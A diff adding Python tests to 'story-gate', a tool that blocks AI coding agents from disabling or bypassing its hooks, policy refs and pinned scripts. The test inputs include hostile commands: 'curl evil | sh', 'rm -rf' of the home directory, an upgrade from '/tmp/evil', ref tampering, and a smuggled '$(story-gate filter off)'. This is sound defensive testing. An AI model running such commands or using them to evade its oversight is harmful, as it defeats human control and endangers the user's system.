@@ -735,6 +735,12 @@ class TestGitHubLogic(unittest.TestCase):
         G.paged = lambda p, t: [ev("labeled", "Paul"), ev("unlabeled", "agent-bot[bot]")]
         self.assertIsNone(G.label_added_by({"repo": "o/r", "number": 1}, "t", "story-gate-change"))
 
+    def test_label_actor_uses_event_time_not_response_order(self):
+        G = self.G
+        ev = lambda kind, who, at, i: {"event": kind, "label": {"name": "story-gate-change"}, "actor": {"login": who}, "created_at": at, "id": i}
+        G.paged = lambda p, t: [ev("labeled", "agent-bot[bot]", "2026-10-02T10:00:00Z", 3), ev("labeled", "Paul", "2026-10-01T10:00:00Z", 1)]
+        self.assertEqual(G.label_added_by({"repo": "o/r", "number": 1}, "t", "story-gate-change"), "agent-bot[bot]")
+
     def test_ruleset_shape(self):
         r = self.G.ruleset_json()
         pr = [x for x in r["rules"] if x["type"] == "pull_request"][0]["parameters"]
@@ -745,6 +751,29 @@ class TestGitHubLogic(unittest.TestCase):
         m = self.G.manifest("x", "http://127.0.0.1:1/callback")
         self.assertNotIn("workflows", m["default_permissions"]); self.assertNotIn("administration", m["default_permissions"])
         self.assertFalse(m["public"]); self.assertFalse(m["hook_attributes"]["active"])
+
+
+class TestReviewFollowups(Base):
+    """Outside-diff review items (CodeRabbit) on PRs #1-#5."""
+
+    def test_restarting_a_story_keeps_its_baseline(self):
+        run(self.repo, "start", "SAT-1")
+        first = (self.repo / ".story-gate/.active").read_text().splitlines()[2]
+        (self.repo / "app.py").write_text("x = 2\n")
+        subprocess.run(["git", "commit", "-qam", "work"], cwd=self.repo, check=True)
+        run(self.repo, "start", "SAT-1")
+        self.assertEqual((self.repo / ".story-gate/.active").read_text().splitlines()[2], first)
+
+    def test_judge_max_chars_is_part_of_the_evidence(self):
+        g = load_gate(self.repo); c = g.cfg()
+        c2 = json.loads(json.dumps(c)); c2["judge"]["max_chars"] = 1000
+        self.assertNotEqual(g.ready_hash_from("s", "c", "t", [], c), g.ready_hash_from("s", "c", "t", [], c2))
+
+    def test_spec_files_outside_the_repository_are_ignored(self):
+        outside = Path(tempfile.mkdtemp()) / "secret.md"; outside.write_text("secret")
+        self.cfg(spec_files=[str(outside), "../" + outside.name, "app.py"])
+        g = load_gate(self.repo)
+        self.assertEqual(g.spec_files(g.cfg()), ["app.py"])
 
 
 class TestRound3Fixes(Base):
@@ -1022,11 +1051,32 @@ class TestTrustedRuntime(RuntimeFixture):
         r = self.hook()
         self.assertEqual(r.returncode, 2); self.assertIn("project hook files", r.stderr)
 
+    def test_permission_rule_naming_gate_is_not_a_project_hook(self):
+        (self.repo / ".claude").mkdir(exist_ok=True)
+        (self.repo / ".claude/settings.json").write_text(json.dumps({"permissions": {"allow": ["Bash(python3 .story-gate/gate.py:*)"]}}))
+        self.assertNotIn("project hook files", self.hook().stderr)
+
+    def test_repository_identity_is_the_same_from_a_subfolder(self):
+        sub = self.repo / "src" / "deep"; sub.mkdir(parents=True)
+        code = "import sys; sys.path.insert(0, sys.argv[1]); import sg_trust as T; print(T.repo_identity(sys.argv[2])[1])"
+        ident = lambda d: subprocess.run([sys.executable, "-c", code, str(SRC), str(d)], capture_output=True, text=True, env=dict(os.environ, **self.env)).stdout
+        self.assertEqual(ident(sub), ident(self.repo))  # git prints the common dir relative to cwd, not to the top
+        self.assertEqual(self.hook(cwd=sub).returncode, 2)
+
     def test_unenrolled_repo_is_untouched(self):
         other = Path(tempfile.mkdtemp())
         subprocess.run(["git", "init", "-q", str(other)], check=True)
-        self.assertEqual(self.hook(cwd=other).returncode, 0)
-        self.assertEqual(self.hook(cwd=Path(tempfile.mkdtemp())).returncode, 0)  # not a git repository at all
+        self.assertEqual(self.hook(cwd=other, payload={"tool_name": "Write", "tool_input": {"file_path": str(other / "a.py")}}).returncode, 0)
+        outside = Path(tempfile.mkdtemp())  # not a git repository at all
+        self.assertEqual(self.hook(cwd=outside, payload={"tool_name": "Write", "tool_input": {"file_path": str(outside / "a.py")}}).returncode, 0)
+
+    def test_hook_from_a_parent_folder_gates_the_edited_repository(self):
+        parent = self.repo.parent  # a workspace folder that isn't a repository itself
+        self.assertFalse((parent / ".git").exists())
+        r = self.hook(cwd=parent, payload={"tool_name": "Write", "tool_input": {"file_path": str(self.repo / "src" / "new.py")}})
+        self.assertEqual(r.returncode, 2, r.stdout + r.stderr)
+        rel = {"tool_name": "Write", "cwd": str(parent), "tool_input": {"file_path": "%s/app.py" % self.repo.name}}
+        self.assertEqual(self.hook(cwd=parent, payload=rel).returncode, 2)
 
     def test_worktree_shares_enrollment(self):
         wt = Path(tempfile.mkdtemp()) / "wt"
@@ -1039,8 +1089,97 @@ class TestTrustedRuntime(RuntimeFixture):
         self.assertEqual(sh("python3 .story-gate/gate.py install --user --unsigned"), 2)
         self.assertEqual(sh("python3 .story-gate/gate.py upgrade --from /tmp/evil"), 2)
         self.assertEqual(sh("rm -rf %s" % self.home), 2)
+        self.assertEqual(sh("sed -i s/abc/def/ .git/packed-refs"), 2)  # moving the policy ref by hand
+        self.assertEqual(sh("echo deadbeef > .git/refs/heads/main"), 2)
         w = {"tool_name": "Write", "tool_input": {"file_path": self.gate}}
         self.assertEqual(self.hook(payload=w).returncode, 2)
+
+    # ---- the `story-gate` command: agents run the verified copy, never the repository's (panel decision sg-branchgate)
+    def sh(self, c, cwd=None):
+        return self.hook(payload={"tool_name": "Bash", "tool_input": {"command": c}}, cwd=cwd)
+
+    def test_install_writes_the_story_gate_command(self):
+        d = self.home / "runtime" / "bin"
+        self.assertIn("story-gate command: %s" % d, self.install_out)
+        posix = (d / "story-gate").read_text()
+        self.assertIn('-I "%s"' % str(self.home / "runtime" / "launch.py").replace("\\", "/"), posix)
+        self.assertIn("%*", (d / "story-gate.cmd").read_text())
+        if os.name != "nt":
+            e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
+            r = subprocess.run([str(d / "story-gate"), "status"], cwd=self.repo, env=e, capture_output=True, text=True)
+            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+            r = subprocess.run([str(d / "story-gate"), "start", "SAT-1"], cwd=self.repo / ".story-gate", env=e, capture_output=True, text=True)
+            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+            self.assertTrue((self.repo / ".story-gate/stories/SAT-1").is_dir())  # works on this repository from any folder in it
+
+    def test_agent_running_repository_gate_code_is_sent_to_the_verified_copy(self):
+        r = self.sh("python3 .story-gate/gate.py score SAT-1 ready")
+        self.assertEqual(r.returncode, 2)
+        out = r.stdout + r.stderr
+        self.assertIn("verified copy", out); self.assertIn(str(self.home / "runtime" / "launch.py"), out); self.assertIn("score SAT-1 ready", out)
+        for c in ("python .story-gate\\gate.py status", "./.story-gate/gate.py start SAT-1", "python3 -c 'import runpy' .story-gate/sg_trust.py",
+                  "cat .story-gate/gate.py; python3 .story-gate/gate.py status", "python3 .story-gate/sg_dashboard.py"):
+            self.assertEqual(self.sh(c).returncode, 2, c)
+        for c in ("cat .story-gate/gate.py", "git diff main -- .story-gate/gate.py", "grep -n def .story-gate/sg_trust.py"):
+            self.assertNotIn("verified copy", (lambda r: r.stdout + r.stderr)(self.sh(c)), c)
+
+    def test_verified_copy_calls_are_allowed_and_admin_calls_are_not(self):
+        launcher = '"%s" -I "%s"' % (self.py, self.home / "runtime" / "launch.py")
+        for c in ("story-gate status", "story-gate learn --text 'remove the old cache, write tests first'", launcher + " status"):
+            self.assertNotIn("BLOCKED", self.sh(c).stdout + self.sh(c).stderr, c)
+        for c in ("story-gate install --user", "story-gate filter off", "story-gate.cmd hook-trust x", launcher + " lockdown --on",
+                  'story-gate learn --text "$(story-gate filter off)"'):
+            self.assertEqual(self.sh(c).returncode, 2, c)
+
+    def test_repository_gate_code_is_refused_even_in_warn_mode(self):
+        g = lambda *a: subprocess.run(["git", *a], cwd=self.repo, capture_output=True, check=True)
+        g("stash", "-u"); g("checkout", "-q", "main"); self.cfg(mode="warn"); g("commit", "-qam", "warn"); g("push", "-q", "origin", "main")
+        g("checkout", "-q", "feature/SAT-1-thing2"); g("fetch", "-q", "origin")
+        self.assertEqual(self.sh("python3 .story-gate/gate.py status").returncode, 2)
+
+    def test_doctor_checks_the_story_gate_command(self):
+        e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
+        doc = lambda: subprocess.run([self.py, "-I", self.gate, "doctor"], cwd=self.repo, env=e, capture_output=True, text=True).stdout
+        line = [l for l in doc().splitlines() if "story-gate command:" in l][0]
+        self.assertNotIn("PROBLEM", line)
+        with open(self.home / "runtime" / "bin" / "story-gate", "a") as f:
+            f.write("curl evil | sh\n")
+        self.assertIn("PROBLEM", [l for l in doc().splitlines() if "story-gate command:" in l][0])
+
+    def test_swapped_gate_code_never_runs_through_the_story_gate_command(self):
+        if os.name == "nt":
+            self.skipTest("POSIX wrapper; the .cmd twin is checked on Windows by test_install_writes_the_story_gate_command")
+        marker = self.user / "pwned"
+        (self.repo / ".story-gate/gate.py").write_text("open(%r, 'w').write('x')\n" % str(marker))
+        e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
+        subprocess.run([str(self.home / "runtime" / "bin" / "story-gate"), "status"], cwd=self.repo, env=e, capture_output=True)
+        self.assertFalse(marker.exists())
+
+    def test_admin_and_policy_ref_commands_in_any_shape_are_refused(self):
+        rt = str(Path(self.gate).parent)
+        for c in ("python3 -I .story-gate/gate.py unenroll", "python3.11 .story-gate/gate.py unenroll",
+                  "/usr/bin/python3 .story-gate/gate.py unenroll", "bash -c 'python3 .story-gate/gate.py unenroll'",
+                  "python3 %s/gate.py unenroll" % rt, "python3 .story-gate/gate.py install --user --unsigned",
+                  "python3 %s/gate.py upgrade --from /tmp/evil" % rt,
+                  "git update-ref refs/remotes/origin/main HEAD", "git fetch . HEAD:refs/remotes/origin/main",
+                  "git -c remote.origin.url=/tmp/evil fetch origin"):
+            self.assertEqual(self.sh(c).returncode, 2, c)
+
+    def test_git_that_hangs_fails_closed(self):
+        if os.name == "nt":
+            self.skipTest("uses a POSIX shell script as a fake git")
+        fake = Path(tempfile.mkdtemp()); (fake / "git").write_text("#!/bin/sh\nsleep 60\n"); (fake / "git").chmod(0o755)
+        e = dict(os.environ, HOME=str(self.user), PATH=str(fake) + os.pathsep + os.environ["PATH"], **self.env)
+        for k in ("STORY_GATE_ROOT", "OPENROUTER_API_KEY", "STORY_GATE_ENV_FILE", "STORY_GATE_TRUSTED_DIR", "CLAUDECODE"):
+            e.pop(k, None)
+        rt = json.loads((self.home / "runtime/active.json").read_text())["dir"]
+        code = ("import sys; sys.path.insert(0, %r); import sg_trust as T; T.GIT_TIMEOUT = 1; import runpy; "
+                "sys.argv = ['gate.py', 'hook', '--client', 'claude', '--event', 'pre']; "
+                "runpy.run_path(%r, run_name='__main__')" % (rt, str(Path(rt) / "gate.py")))
+        r = subprocess.run([self.py, "-c", code], cwd=self.repo,
+                           input=json.dumps({"tool_name": "Write", "tool_input": {"file_path": str(self.repo / "app.py")}}),
+                           capture_output=True, text=True, env=e, timeout=60)
+        self.assertEqual(r.returncode, 2, r.stdout + r.stderr); self.assertIn("BLOCKED", r.stdout + r.stderr)
 
     def test_dry_run_uninstall_and_backups(self):
         own = {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "echo mine"}]}]}, "theme": "dark"}
@@ -1075,9 +1214,20 @@ class TestTrustedRuntime(RuntimeFixture):
         g("init", "-q", "-b", "main"); g("config", "user.email", "t@t"); g("config", "user.name", "t"); g("add", "."); g("commit", "-qm", "i")
         g("checkout", "-qb", "feature/SAT-9-x")
         e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
-        out = subprocess.run([self.py, "-I", self.gate, "enroll"], cwd=solo, env=e, capture_output=True, text=True).stdout
-        self.assertIn("main", out)
-        self.assertEqual(self.hook(cwd=solo, payload={"tool_name": "Write", "tool_input": {"file_path": str(solo / "a.py")}}).returncode, 2)
+        enroll = lambda *a: subprocess.run([self.py, "-I", self.gate, "enroll", *a], cwd=solo, env=e, capture_output=True, text=True)
+        write = {"tool_name": "Write", "tool_input": {"file_path": str(solo / "a.py")}}
+        r = enroll()  # a local branch is a weak policy source: refused unless the human says so
+        self.assertEqual(r.returncode, 1); self.assertIn("--allow-local-policy", r.stdout)
+        r = enroll("--allow-local-policy")
+        self.assertEqual(r.returncode, 0, r.stdout); self.assertIn("main", r.stdout); self.assertIn("WARNING", r.stdout)
+        self.assertEqual(self.hook(cwd=solo, payload=write).returncode, 2)
+        # an enrollment made before this rule (local ref, no allow flag) fails closed instead of trusting the local branch
+        ep = self.home / "enrolled.json"; data = json.loads(ep.read_text())
+        for v in data.values():
+            v.pop("allow_local_policy", None)
+        ep.write_text(json.dumps(data))
+        r = self.hook(cwd=solo, payload=write)
+        self.assertEqual(r.returncode, 2); self.assertIn("not a remote's branch", r.stdout + r.stderr)
 
     def test_submodule_inside_enrolled_repo(self):
         sub_src = Path(tempfile.mkdtemp()) / "lib"
@@ -1271,7 +1421,7 @@ class TestRepoHookGuard(RuntimeFixture):
         (solo / ".gitattributes").write_text(".claude/settings.json filter=lfs\n")
         g = lambda *a: subprocess.run(["git", *a], cwd=solo, capture_output=True, check=True)
         g("init", "-q", "-b", "main"); g("config", "user.email", "t@t"); g("config", "user.name", "t"); g("add", "."); g("commit", "-qm", "i")
-        r = self.admin("enroll", cwd=solo)
+        r = self.admin("enroll", "--allow-local-policy", cwd=solo)
         self.assertIn("NOT turned on", r.stdout); self.assertIn("lfs", r.stdout)
         self.assertEqual(self.git("config", "--local", "--get", "filter.storygate-hooks.smudge", cwd=solo, check=False).stdout, "")
 
@@ -1379,10 +1529,32 @@ class TestRepoHookGuard(RuntimeFixture):
     def test_rollback_keeps_hooks_working(self):
         e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
         act = json.loads((self.home / "runtime/active.json").read_text())
-        act["previous"] = act["dir"]; (self.home / "runtime/active.json").write_text(json.dumps(act))
+        act["previous"] = act["dir"]; act["previous_manifest_sha256"] = act["manifest_sha256"]
+        (self.home / "runtime/active.json").write_text(json.dumps(act))
         r = subprocess.run([self.py, "-I", self.gate, "rollback"], cwd=self.repo, env=e, capture_output=True, text=True)
         self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
         self.assertNotIn("integrity", self.hook().stderr)
+
+    def test_rollback_checks_the_previous_runtime_against_its_own_manifest(self):
+        import hashlib
+        e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
+        act_p = self.home / "runtime/active.json"
+        act = json.loads(act_p.read_text())
+        old = self.home / "runtime/0.0.0-older"
+        shutil.copytree(act["dir"], old)
+        man = json.loads((old / "manifest.json").read_text()); man["installed_at"] = "2020-01-01T00:00:00Z"  # a different install
+        (old / "manifest.json").write_text(json.dumps(man, indent=2) + "\n")
+        act["previous"] = str(old); act["previous_manifest_sha256"] = hashlib.sha256((old / "manifest.json").read_bytes()).hexdigest()
+        act_p.write_text(json.dumps(act))
+        rb = lambda: subprocess.run([self.py, "-I", self.gate, "rollback"], cwd=self.repo, env=e, capture_output=True, text=True)
+        (old / "gate.py").write_text((old / "gate.py").read_text() + "\n# tampered\n")
+        r = rb()
+        self.assertEqual(r.returncode, 1); self.assertIn("integrity", r.stdout)
+        self.assertEqual(json.loads(act_p.read_text())["dir"], act["dir"])
+        (old / "gate.py").write_text((Path(act["dir"]) / "gate.py").read_text())
+        r = rb()
+        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)  # before the fix this always refused: two installs never share a manifest hash
+        self.assertEqual(Path(json.loads(act_p.read_text())["dir"]).resolve(), old.resolve())
 
     def test_filter_off_is_logged_and_on_restores(self):
         r = self.admin("filter", "off")
@@ -1394,7 +1566,9 @@ class TestRepoHookGuard(RuntimeFixture):
 
     # ---- proof
     def test_doctor_prove_passes_and_fails_honestly(self):
+        before_head = self.git("rev-parse", "HEAD").stdout.strip()
         r = self.admin("doctor", "--prove")
+        self.assertEqual(self.git("rev-parse", "HEAD").stdout.strip(), before_head)  # the canary never lands on your branch
         self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
         self.assertIn("PASSED", r.stdout); self.assertIn("canary removed", r.stdout)
         self.assertEqual(self.git("worktree", "list").stdout.count("\n"), 1)  # the throwaway worktree is gone
@@ -1439,6 +1613,12 @@ class TestRepoHookGuard(RuntimeFixture):
         self.assertNotEqual(r.returncode, 0); self.assertIn("lockdown is still on", r.stdout)  # never strand Claude's hooks
         r = self.admin("lockdown", "--off", extra=e)
         self.assertEqual(r.returncode, 0); self.assertFalse(dropin.exists())
+
+    def test_kept_project_hook_may_not_run_repository_files(self):
+        e = self.lock_env()
+        self.approve_on_main({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "python scripts/hook.py"}]}]}})
+        r = self.admin("lockdown", "--on", "--consent", "yes", "--keep-project-hook", "python scripts/hook.py", extra=e)
+        self.assertNotEqual(r.returncode, 0); self.assertIn("runs a file from the repository", r.stdout)
 
     def test_lockdown_never_touches_it_managed_file(self):
         e = self.lock_env()
@@ -1493,6 +1673,44 @@ class TestRepoHookGuard(RuntimeFixture):
         self.assertEqual(self.git("config", "--local", "--get", "filter.storygate-hooks.smudge", check=False).stdout, "")
         self.assertFalse((self.home / "install-manifest.json").exists())
 
+    def test_restore_refuses_when_the_link_target_changed(self):
+        if os.name == "nt":
+            self.skipTest("symlinks need extra rights on Windows")
+        run(self.repo, "uninstall", "--user", env=self.env)
+        a = self.user / "dot/a.json"; b = self.user / "dot/b.json"; a.parent.mkdir(); a.write_text("{}\n")
+        link = self.user / ".cursor/hooks.json"
+        if link.exists() or link.is_symlink():
+            link.unlink()
+        link.symlink_to(a)
+        run(self.repo, "install", "--user", "--unsigned", env=self.env)
+        b.write_text(a.read_text()); link.unlink(); link.symlink_to(b)  # same bytes, different target
+        r = run(self.repo, "uninstall", "--user", env=self.env)
+        self.assertIn("not restored", r.stdout); self.assertIn("hook --client cursor", b.read_text())
+
+    def test_restore_fails_closed_for_a_link_from_an_older_install(self):
+        if os.name == "nt":
+            self.skipTest("symlinks need extra rights on Windows")
+        run(self.repo, "uninstall", "--user", env=self.env)
+        a = self.user / "dot/a.json"; a.parent.mkdir(); a.write_text("{}\n")
+        link = self.user / ".cursor/hooks.json"
+        if link.exists() or link.is_symlink():
+            link.unlink()
+        link.symlink_to(a)
+        run(self.repo, "install", "--user", "--unsigned", env=self.env)
+        mf = self.home / "install-manifest.json"
+        data = json.loads(mf.read_text())
+        for e in data["files"].values():
+            e.pop("real_before", None)  # what an install from before link tracking recorded
+        mf.write_text(json.dumps(data))
+        r = run(self.repo, "uninstall", "--user", env=self.env)
+        self.assertIn("didn't record its target", r.stdout)
+        self.assertTrue(link.is_symlink()); self.assertIn("hook --client cursor", a.read_text())
+
+    def test_plan_without_an_id_prints_usage(self):
+        r = run(self.repo, "plan", env=self.env)
+        self.assertNotEqual(r.returncode, 0)
+        self.assertIn("usage: gate.py plan <ID>", r.stderr); self.assertNotIn("IndexError", r.stderr)
+
     def test_unenroll_turns_the_filter_off(self):
         r = self.admin("unenroll")
         self.assertIn("Checkout filter off", r.stdout)
@@ -1524,6 +1742,246 @@ class TestRepoHookGuard(RuntimeFixture):
         html = (self.user / "dash/dashboard.html").read_text()
         self.assertIn("This computer", html); self.assertIn("partial: checkout filter", html)
         self.assertNotIn('sg-pill pass">partial', html)  # partial protection is never shown as green
+
+
+class TestPinnedHooks(RuntimeFixture):
+    """Approved hooks that run repository scripts run only the default branch's copy (panel decision sg-scriptpin)."""
+
+    CHECK = "bash scripts/check.sh"
+
+    def git(self, *a, cwd=None, check=True):
+        return subprocess.run(["git", *a], cwd=cwd or self.repo, capture_output=True, text=True, check=check)
+
+    def admin(self, *args):
+        e = dict(os.environ, HOME=str(self.user), **self.env)
+        for k in ("STORY_GATE_ROOT", "OPENROUTER_API_KEY", "STORY_GATE_ENV_FILE", "STORY_GATE_TRUSTED_DIR", "CLAUDECODE", "GITHUB_ACTIONS"):
+            e.pop(k, None)
+        return subprocess.run([self.py, "-I", self.gate, *args], cwd=self.repo, capture_output=True, text=True, env=e, timeout=120,
+                              stdin=subprocess.DEVNULL)
+
+    def setup_main(self, hooks, allowed, files=None):
+        self.git("checkout", "-q", "main")
+        for name, body in (files or {"scripts/check.sh": "echo MAIN-COPY\n"}).items():
+            f = self.repo / name; f.parent.mkdir(parents=True, exist_ok=True); f.write_text(body)
+        (self.repo / ".claude").mkdir(exist_ok=True)
+        (self.repo / ".claude/settings.json").write_text(json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": c} for c in hooks]}]}}, indent=2))
+        self.cfg(mode="enforce", project_hooks_allowed=allowed)
+        self.git("add", "-A"); self.git("commit", "-qm", "hooks"); self.git("push", "-q", "origin", "main")
+        self.git("checkout", "-q", "feature/SAT-1-thing2"); self.git("merge", "-q", "main")
+
+    def disk_commands(self):
+        d = json.loads((self.repo / ".claude/settings.json").read_text())
+        return [h["command"] for g in d.get("hooks", {}).get("Stop", []) for h in g.get("hooks", [])]
+
+    def fire(self, cmd, stdin=""):
+        e = dict(os.environ); e.pop("STORY_GATE_ROOT", None); e["CLAUDE_PROJECT_DIR"] = str(self.repo)
+        return subprocess.run(cmd, shell=True, cwd=self.repo, input=stdin, capture_output=True, text=True, env=e, timeout=60)
+
+    def at_terminal(self, args, typed):
+        """Run the installed runtime under a pseudo-terminal and type `typed`, like a person would."""
+        import pty, select
+        e = dict(os.environ, HOME=str(self.user), **self.env)
+        for k in ("STORY_GATE_ROOT", "GITHUB_ACTIONS", "CLAUDECODE"):
+            e.pop(k, None)
+        pid, fd = pty.fork()
+        if pid == 0:
+            os.chdir(str(self.repo)); os.execve(self.py, [self.py, "-I", self.gate, *args], e)
+        out, sent = b"", False
+        while True:
+            r, _, _ = select.select([fd], [], [], 30)
+            if not r:
+                break
+            try:
+                chunk = os.read(fd, 4096)
+            except OSError:
+                break
+            if not chunk:
+                break
+            out += chunk
+            if not sent and b"YES" in out:
+                os.write(fd, typed.encode()); sent = True
+        os.waitpid(pid, 0)
+        return out.decode("utf-8", "replace")
+
+    def pinned_setup(self):
+        self.setup_main([self.CHECK], [{"command": self.CHECK, "pins": ["scripts/check.sh"]}])
+        (wrapped,) = self.disk_commands()
+        self.assertIn("run-approved", wrapped)
+        return wrapped
+
+    def test_pinned_hook_runs_the_default_branch_copy(self):
+        wrapped = self.pinned_setup()
+        self.assertEqual(self.git("status", "--porcelain").stdout.strip(), "")  # git still sees the stored file
+        r = self.fire(wrapped)
+        self.assertEqual(r.returncode, 0, r.stderr); self.assertIn("MAIN-COPY", r.stdout)
+
+    def test_branch_edit_of_a_pinned_script_is_refused(self):
+        wrapped = self.pinned_setup()
+        (self.repo / "scripts/check.sh").write_text("echo BRANCH-COPY\n")
+        self.git("commit", "-qam", "branch edits the script")  # settings file unchanged: git never re-filters it
+        r = self.fire(wrapped)
+        self.assertEqual(r.returncode, 2); self.assertNotIn("BRANCH-COPY", r.stdout); self.assertIn("scripts/check.sh", r.stderr)
+        t = self.admin("hook-trust", self.CHECK)  # no terminal (like an agent's shell): refused
+        self.assertNotEqual(t.returncode, 0); self.assertIn("needs a person", t.stdout)
+        if os.name == "nt":
+            self.skipTest("typing YES at a terminal is tested on POSIX")
+        t = self.at_terminal(["hook-trust", self.CHECK], "YES\n")  # a person types YES
+        self.assertIn("Trusted for exactly", t)
+        self.assertIn("BRANCH-COPY", self.fire(wrapped).stdout)
+        (self.repo / "scripts/check.sh").write_text("echo CHANGED-AGAIN\n")
+        self.assertEqual(self.fire(wrapped).returncode, 2)  # trust was for that content only
+        self.assertIn("hook-trust", (self.repo / ".git/story-gate-guard.log").read_text())
+
+    def test_new_file_in_a_pinned_folder_is_refused(self):
+        self.setup_main(["bash tools/run.sh"], [{"command": "bash tools/run.sh", "pins": ["tools"]}],
+                        {"tools/run.sh": "for f in $(dirname $0)/*.sh; do echo $f; done\n"})
+        (wrapped,) = self.disk_commands()
+        (self.repo / "tools/evil.sh").write_text("echo EVIL\n")
+        r = self.fire(wrapped)
+        self.assertEqual(r.returncode, 2); self.assertIn("tools/evil.sh", r.stderr)
+
+    def test_ignored_file_in_a_pinned_folder_is_refused(self):
+        self.setup_main(["bash tools/run.sh"], [{"command": "bash tools/run.sh", "pins": ["tools"]}],
+                        {"tools/run.sh": "echo run\n", ".gitignore": "tools/*.local\n"})
+        (wrapped,) = self.disk_commands()
+        (self.repo / "tools/x.local").write_text("echo hidden\n")
+        r = self.fire(wrapped)
+        self.assertEqual(r.returncode, 2); self.assertIn("tools/x.local", r.stderr)
+
+    def test_planted_cache_file_is_detected(self):
+        wrapped = self.pinned_setup()
+        self.assertEqual(self.fire(wrapped).returncode, 0)
+        (cached,) = list((self.home / "approved-cache").glob("*/scripts/check.sh"))
+        cached.chmod(0o644); cached.write_text("echo PLANTED\n")
+        r = self.fire(wrapped)
+        self.assertNotIn("PLANTED", r.stdout); self.assertIn("MAIN-COPY", r.stdout)  # rebuilt from the commit
+
+    def test_planted_bytecode_in_the_cache_is_detected(self):
+        wrapped = self.pinned_setup()
+        self.fire(wrapped)
+        (cache,) = list((self.home / "approved-cache").glob("*/scripts"))
+        cache.chmod(0o755); (cache / "__pycache__").mkdir(); (cache / "__pycache__" / "lib.cpython-39.pyc").write_bytes(b"x")
+        self.fire(wrapped)
+        self.assertFalse((cache / "__pycache__").exists())  # rebuilt: any extra file fails the check
+
+    def test_status_stays_clean_through_stash_rebase_and_checkout(self):
+        wrapped = self.pinned_setup()
+        (self.repo / "app.py").write_text("x = 3\n"); self.git("stash", "-q"); self.git("stash", "pop", "-q")
+        self.assertEqual(self.git("status", "--porcelain").stdout.strip(), "M app.py")
+        self.git("commit", "-qam", "work"); self.git("checkout", "-q", "main"); (self.repo / "other.txt").write_text("o\n"); self.git("add", "other.txt")
+        self.git("commit", "-qm", "main moves"); self.git("push", "-q", "origin", "main")
+        self.git("checkout", "-q", "feature/SAT-1-thing2"); self.git("rebase", "-q", "main")
+        self.assertEqual(self.git("status", "--porcelain").stdout.strip(), "")
+        self.assertEqual(self.disk_commands(), [wrapped])
+        self.assertEqual(self.fire(wrapped).returncode, 0)
+
+    def test_relative_shebang_is_refused(self):
+        self.setup_main(["./scripts/check.sh"], [{"command": "./scripts/check.sh", "pins": ["scripts/check.sh"]}],
+                        {"scripts/check.sh": "#!venv/bin/python\nprint(1)\n"})
+        (wrapped,) = self.disk_commands()
+        r = self.fire(wrapped)
+        self.assertEqual(r.returncode, 2); self.assertIn("relative path", r.stderr)
+
+    def test_shebang_into_the_repository_is_refused(self):
+        self.setup_main(["./scripts/check.sh"], [{"command": "./scripts/check.sh", "pins": ["scripts/check.sh"]}],
+                        {"scripts/check.sh": "#!%s/venv/bin/python\nprint(1)\n" % str(self.repo).replace("\\", "/")})
+        (wrapped,) = self.disk_commands()
+        r = self.fire(wrapped)
+        self.assertEqual(r.returncode, 2); self.assertIn("inside the repository", r.stderr)
+
+    def test_runner_latency(self):
+        files = {"tools/run.sh": "echo ok\n"}
+        files.update({"tools/lib/f%03d.sh" % i: "x=%d\n" % i for i in range(300)})
+        self.setup_main(["bash tools/run.sh"], [{"command": "bash tools/run.sh", "pins": ["tools"]}], files)
+        (wrapped,) = self.disk_commands()
+        self.fire(wrapped)  # first run builds the protected copy
+        import time as _t
+        times = []
+        for _ in range(5):
+            t0 = _t.time(); r = self.fire(wrapped); times.append(_t.time() - t0)
+            self.assertEqual(r.returncode, 0, r.stderr)
+        times.sort()
+        self.assertLess(times[-1], 3.0)  # generous for CI; typical is well under 1 s
+        print("\n[runner latency, 301 pinned files] median %.2fs max %.2fs" % (times[2], times[-1]))
+
+    def test_raw_pinned_command_on_disk_is_not_approved(self):
+        self.pinned_setup()
+        (self.repo / ".claude/settings.json").write_text(json.dumps({"hooks": {"Stop": [{"hooks": [{"type": "command", "command": self.CHECK}]}]}}))
+        r = self.hook()  # the raw script command, as if the filter had skipped the file
+        self.assertEqual(r.returncode, 2); self.assertIn("hasn't approved", r.stderr)
+
+    def test_admin_commands_are_blocked_even_in_warn_mode(self):
+        self.git("checkout", "-q", "main"); self.cfg(mode="warn"); self.git("commit", "-qam", "warn"); self.git("push", "-q", "origin", "main")
+        self.git("checkout", "-q", "feature/SAT-1-thing2"); self.git("merge", "-q", "main")
+        sh = lambda c: self.hook(payload={"tool_name": "Bash", "tool_input": {"command": c}})
+        for c in ('python3 .story-gate/gate.py hook-trust "bash scripts/check.sh"', "python3 .story-gate/gate.py filter off",
+                  "git config --local --unset filter.storygate-hooks.required"):
+            self.assertEqual(sh(c).returncode, 2, c)
+        self.assertEqual(sh("git status").returncode, 0)
+
+    def test_stdin_and_exit_code_pass_through(self):
+        self.setup_main([self.CHECK], [{"command": self.CHECK, "pins": ["scripts/check.sh"]}],
+                        {"scripts/check.sh": "read line; echo got:$line; exit 3\n"})
+        (wrapped,) = self.disk_commands()
+        r = self.fire(wrapped, stdin='{"tool":"x"}\n')
+        self.assertEqual(r.returncode, 3, r.stderr); self.assertIn('got:{"tool":"x"}', r.stdout)
+
+    def test_unpinned_repo_scripts_and_runners_are_removed_unless_accepted(self):
+        self.setup_main([self.CHECK, "npm run lint", "echo plain-hook", "npx eslint ."],
+                        ["echo plain-hook", {"command": "npx eslint .", "runs_repo_code": "accepted"}])
+        cmds = self.disk_commands()
+        self.assertNotIn(self.CHECK, cmds); self.assertNotIn("npm run lint", cmds)  # not pinned: off disk
+        self.assertIn("echo plain-hook", cmds); self.assertIn("npx eslint .", cmds)  # plain / explicitly accepted
+        self.assertEqual(self.git("status", "--porcelain").stdout.strip(), "")
+        out = self.admin("doctor").stdout
